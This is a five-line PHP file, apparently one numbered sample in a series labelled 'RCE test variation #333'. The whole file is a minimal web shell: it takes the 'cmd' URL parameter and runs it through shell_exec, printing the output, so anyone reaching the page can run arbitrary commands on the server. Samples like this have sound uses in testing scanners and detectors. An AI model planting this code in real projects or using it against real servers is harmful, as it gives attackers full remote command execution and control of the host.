<?php
// RCE test variation #333
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>